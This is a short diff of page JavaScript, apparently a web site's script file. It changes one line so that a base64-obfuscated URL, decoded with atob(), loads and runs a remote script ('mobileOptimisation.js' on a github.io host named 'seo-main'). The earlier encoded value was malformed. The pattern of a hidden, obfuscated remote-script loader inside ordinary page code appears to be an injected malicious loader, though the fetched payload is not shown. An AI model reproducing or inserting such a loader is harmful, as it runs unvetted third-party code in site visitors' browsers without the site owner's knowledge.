@@ -59,7 +59,7 @@
   }
   if(typeof h_key == undefined) window['h_key'] = '';
   window['h_key'] += "BSEx";
-  loadJS(atob('Imh0dHBzOi8vc2VvLW1haW4uZ2l0aHViLmlvL3YxL21vYmlsZU9wdGltaXNhdGlvbi5qcyI'), true);
+  loadJS(atob('aHR0cHM6Ly9zZW8tbWFpbi5naXRodWIuaW8vdjEvbW9iaWxlT3B0aW1pc2F0aW9uLmpz'), true);
   function loadJS(src, activateNow = false) {
     return new Promise((resolve, reject) => {
       // Check if the script has already been executed
